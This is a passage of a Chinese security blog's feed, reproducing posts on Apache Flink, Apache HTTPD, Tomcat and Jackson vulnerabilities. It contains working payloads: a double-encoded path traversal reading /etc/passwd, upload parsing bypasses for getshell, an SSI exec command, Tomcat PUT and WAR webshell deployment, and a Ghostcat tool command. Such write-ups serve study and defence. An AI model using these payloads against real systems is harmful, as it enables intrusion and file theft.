filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/flink/1.png" alt=""></p><p>漏洞分析：<br><a href="https://xz.aliyun.com/t/8993" target="_blank" rel="noopener">CVE-2020-17519 &amp; CVE-2020-17518 分析</a></p><h1 id="Apache-Flink-jobmanager-logs-目录穿越漏洞-CVE-2020-17519"><a href="#Apache-Flink-jobmanager-logs-目录穿越漏洞-CVE-2020-17519" class="headerlink" title="Apache Flink jobmanager/logs 目录穿越漏洞(CVE-2020-17519)"></a>Apache Flink jobmanager/logs 目录穿越漏洞(CVE-2020-17519)</h1><p>Apache Flink框架是一个开源的流处理与强大的流和批处理功能。 　　 　　改变了Apache Flink 1.11.0(1.11.1释放和1.11.2)允许攻击者读取本地文件系统上的任何文件JobManager JobManager通过REST接口的过程。    </p><p>允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。访问仅限于JobManager进程可访问的文件。</p><p>影响版本：Apache Flink: 1.11.0, 1.11.1, 1.11.2     </p><p>比如我这里读取/etc/下的passwd文件,%252f为/的两次url编码</p><pre><code class="bash">/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</code></pre><p><img src="../../images/middleware/flink/4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Flink是一个分布式大数据处理引擎，可以对有限数据流和无限数据流进行有状态计算。可部署在各种集群环境，对各种大小的数据规模进行快速计算。   &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache漏洞</title>
    <link href="https://blog.cfyqy.com/article/b0e821f4.html"/>
    <id>https://blog.cfyqy.com/article/b0e821f4.html</id>
    <published>2021-04-15T01:24:47.000Z</published>
    <updated>2021-04-15T08:47:30.927Z</updated>
    
    <content type="html"><![CDATA[<p>apache小组起家的apache更名为httpd，也更符合其http server的特性。而apache现在成为 apache基金会下几十种开源项目的标识。apache和httpd是一个，到apache2后就叫httpd了。</p><a id="more"></a><h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。    </p><p>漏洞复现<br>上传一个名为index.php的文件，被拦截，在index.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截<br><img src="../../images/middleware/apache/1.png" alt=""><br>访问刚才上传的/index.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：<br><img src="../../images/middleware/apache/2.png" alt=""></p><h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><p>Apache HTTPD 多后缀解析漏洞<br>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text&#x2F;html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure><p>其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><p>漏洞复现：   </p><p><a href="http://your-ip/index.php" target="_blank" rel="noopener">http://your-ip/index.php</a> 中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell。<br><img src="../../images/middleware/apache/3.png" alt=""></p><h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。 </p><p>详细命令可看如下文章：<br><a href="https://httpd.apache.org/docs/2.4/howto/ssi.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/2.4/howto/ssi.html</a><br><a href="https://www.w3.org/Jigsaw/Doc/User/SSI.html" target="_blank" rel="noopener">https://www.w3.org/Jigsaw/Doc/User/SSI.html</a></p><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure><p><img src="../../images/middleware/apache/4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;apache小组起家的apache更名为httpd，也更符合其http server的特性。而apache现在成为 apache基金会下几十种开源项目的标识。apache和httpd是一个，到apache2后就叫httpd了。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Tomcat 漏洞</title>
    <link href="https://blog.cfyqy.com/article/3ae4417d.html"/>
    <id>https://blog.cfyqy.com/article/3ae4417d.html</id>
    <published>2021-04-13T16:18:18.000Z</published>
    <updated>2021-04-27T07:39:25.754Z</updated>
    
    <content type="html"><![CDATA[<p>Tomcat相关知识点学习</p><a id="more"></a><h1 id="Tomcat-PUT任意文件上传-CVE-2017-12615"><a href="#Tomcat-PUT任意文件上传-CVE-2017-12615" class="headerlink" title="Tomcat PUT任意文件上传(CVE-2017-12615)"></a>Tomcat PUT任意文件上传(CVE-2017-12615)</h1><p>当存在漏洞的Tomcat 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。   </p><p>影响范围：Apache Tomcat  5.x 到 9.x </p><p>Tomcat设置写权限(只读的= false),导致的结果我们可以写文件到服务器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>虽然Tomcat检查文件后缀在某种程度上(不能直接编写jsp),我们仍然可以绕过限制通过文件系统的一些特性(例如使用/ Linux和window,使用%20、::$DATA window)   </p><p>漏洞复现：<br>启动vulhub环境，利用 PUT 请求创建文件：<br><img src="../../images/java/tomcat/1.png" alt=""><br>提示404，JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。 </p><p>利用系统特性绕过<br><img src="../../images/java/tomcat/2.png" alt=""></p><p>漏洞分析：  </p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e" target="_blank" rel="noopener">Tomcat 远程代码执行漏洞分析</a></p><h1 id="tomcat7后台war部署上传shell"><a href="#tomcat7后台war部署上传shell" class="headerlink" title="tomcat7后台war部署上传shell"></a>tomcat7后台war部署上传shell</h1><p>Tomcat支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。其中，欲访问后台，需要对应用户有相应权限。  </p><p>Tomcat7+权限分为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">manager（后台管理）</span><br><span class="line">manager-gui 拥有html页面权限</span><br><span class="line">manager-status 拥有查看status的权限</span><br><span class="line">manager-script 拥有text接口的权限，和status权限</span><br><span class="line">manager-jmx 拥有jmx权限，和status权限</span><br><span class="line">host-manager（虚拟主机管理）</span><br><span class="line">admin-gui 拥有html页面权限</span><br><span class="line">admin-script 拥有text接口权限</span><br></pre></td></tr></table></figure><p>在conf/tomcat-users.xml文件中配置用户的权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tomcat-users</span> <span class="attr">xmlns</span>=<span class="string">"http://tomcat.apache.org/xml"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://tomcat.apache.org/xml tomcat-users.xsd"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-gui"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-script"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-jmx"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-status"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin-gui"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin-script"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">"tomcat"</span> <span class="attr">password</span>=<span class="string">"tomcat"</span> <span class="attr">roles</span>=<span class="string">"manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>tomcat8中默认没有任何用户，且manager页面只允许本地IP访问  </p><p>漏洞复现：  </p><p>用户名密码：tomcat:tomcat<br><img src="../../images/java/tomcat/3.png" alt=""></p><p>getshell<br><img src="../../images/java/tomcat/4.png" alt=""></p><h1 id="Tomcat-AJP-文件包含漏洞-CVE-2020-1938"><a href="#Tomcat-AJP-文件包含漏洞-CVE-2020-1938" class="headerlink" title="Tomcat AJP 文件包含漏洞(CVE-2020-1938)"></a>Tomcat AJP 文件包含漏洞(CVE-2020-1938)</h1><p>Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><p>Tomcat根据默认配置(conf/server.xml）启动两个连接器。一个是HTTP Connector默认监听8080端口处理HTTP请求，一个AJP connector默认8009端口处理AJP请求。Tomcat处理两个协议请求区别并不大，AJP协议相当于HTTP协议的二进制优化版。</p><p>本次漏洞出现在通过设置AJP请求属性，可控制AJP连接器封装的request对象的属性，最终导致文件包含可以任意文件读取和代码执行。   </p><p>受影响版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 6</span><br><span class="line">Apache Tomcat 7 &lt; 7.0.100</span><br><span class="line">Apache Tomcat 8 &lt; 8.5.51</span><br><span class="line">Apache Tomcat 9 &lt; 9.0.31</span><br></pre></td></tr></table></figure><p>利用工具：<br><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 目的ip -p 8009 -f &#x2F;WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></figure><p><img src="../../images/java/tomcat/5.png" alt=""></p><p>工具二：<a href="https://github.com/0nise/CVE-2020-1938" target="_blank" rel="noopener">https://github.com/0nise/CVE-2020-1938</a></p><p>漏洞分析：   </p><p>tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性<br><img src="../../images/java/tomcat/6.png" alt=""><br>因此可以通过此种特性从而可以控制request对象的下面三个Attribute属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.include.request_uri</span><br><span class="line">javax.servlet.include.path_info</span><br><span class="line">javax.servlet.include.servlet_path</span><br></pre></td></tr></table></figure><p>详情可看：     </p><p><a href="https://www.anquanke.com/post/id/199347" target="_blank" rel="noopener">Tomcat-Ajp协议漏洞分析</a><br> <a href="https://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/" target="_blank" rel="noopener">CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析</a>   </p><h1 id="Apache-Tomcat-Websocket-DoS（CVE-2020-13935-）"><a href="#Apache-Tomcat-Websocket-DoS（CVE-2020-13935-）" class="headerlink" title="Apache Tomcat Websocket DoS（CVE-2020-13935 ）"></a>Apache Tomcat Websocket DoS（CVE-2020-13935 ）</h1><p>详情可看：<br><a href="https://www.anquanke.com/post/id/222279" target="_blank" rel="noopener">CVE-2020-13935 Apache Tomcat Websocket DoS 漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Tomcat相关知识点学习&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Jackson漏洞</title>
    <link href="https://blog.cfyqy.com/article/64cb820c.html"/>
    <id>https://blog.cfyqy.com/article/64cb820c.html</id>
    <published>2021-04-01T02:24:53.000Z</published>
    <updated>2021-04-15T08:48:31.869Z</updated>
    
    <content type="html"><![CDATA[<p>Jackson是一款当下流行的json解释器，主要负责处理Json的序列化和反序列化。</p><a id="more"></a><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>jackson核心模块由三部分构成：</p><ul><li>jackson-core - 核心包，提供基于流模式API</li><li>jackson-annotations - 注解包，提供标准注解功能</li><li>jackson-databind - 数据绑定包， 提供基于”对象绑定” 解析的相关 API （ ObjectMapper ） 和”树模型” 解析的相关 API</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="string">"test"</span>,<span class="number">18</span>);</span><br><span class="line">        ObjectMapper objectMapper=<span class="keyword">new</span> ObjectMapper();</span><br><span class="line">         String json=objectMapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        User user1=objectMapper.readValue(json,User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(user1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Jackson有一种特殊的机制 — JacksonPolymorphicDeserialization，这里可以翻译为Jackson的多态类型绑定,即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行。<br>从<a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization" target="_blank" rel="noopener">文档</a>中可以看到两种情况，一种是 Global default typing（全局的DefaultTyping），另一种是 @JsonTypeInfo 注解两种方式。</p><p>DefaultTyping在这个方式里面一种有4个值</p><ul><li>JAVA_LANG_OBJECT ：当类里的属性声明为一个Object时，会对该属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化/反序列化的类）。</li><li>OBJECT_AND_NON_CONCRETE ：除了上文 提到的特征，当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。（当然，这些类本身需要是合法的、可以被序列化/反序列化的对象）。</li><li>NON_CONCRETE_AND_ARRAYS ：除了上文提到的特征，还支持上文全部类型的Array类型。</li><li>NON_FINAL ：包括上文提到的所有特征，而且包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的的属性信息都需要被序列化和反序列化。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JavaLangObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        People p = <span class="keyword">new</span> People();</span><br><span class="line">        p.age = <span class="number">10</span>;</span><br><span class="line">        p.name = <span class="string">"Mike"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> ObjectDemo();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        <span class="comment">//&#123;"age":10,"name":"Mike","object":["com.jacksondemo.ObjectDemo",&#123;"length":100&#125;]&#125;</span></span><br><span class="line">        People p2 = mapper.readValue(json, People<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">        <span class="comment">//age=10, name=Mike, com.jacksondemo.ObjectDemo@245614d6</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@JsonTypeInfo 也是jackson多态类型绑定的一种方式，它一共支持下面5种类型的取值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.COSTOM)</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jsontypeinfo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper= <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name= <span class="string">"Mike"</span>;</span><br><span class="line">        user.age=<span class="number">100</span>;</span><br><span class="line">        user.obj=<span class="keyword">new</span> Height();</span><br><span class="line">        String json = mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line">    <span class="keyword">public</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span> + name + <span class="string">" age:"</span> + age + <span class="string">" obj:"</span> + obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Height</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> h = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（1）、Id.NONE<br>这种方式的输出结果实际上是我们最想要的，这里只需要相关参数的值，并没有其他一些无用信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Mike"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"obj"</span>:&#123;<span class="string">"h"</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>（2）、Id.CLASS<br>这种方式的输出结果中携带了相关java类，也就是说反序列化的时候如果使用了JsonTypeInfo.Id.CLASS修饰的话，可以通过 @class 方式指定相关类，并进行相关调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Mike"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"obj"</span>:&#123;<span class="string">"@class"</span>:<span class="string">"com.jacksondemo.Height"</span>,<span class="string">"h"</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>（3）、Id.MINIMAL_CLASS<br>这种方式的输出结果也携带了相关类，和 id.CLASS 的区别在 @class 变成了 @c ，从官方文档中描述中这个应该是一个更短的类名字。同样也就是说反序列化的时候如果使用了JsonTypeInfo.Id.MINIMAL_CLASS修饰的话，可以通过 @c 方式指定相关类，并进行相关调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Mike"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"obj"</span>:&#123;<span class="string">"@c"</span>:<span class="string">"com.jacksondemo.Height"</span>,<span class="string">"h"</span>:<span 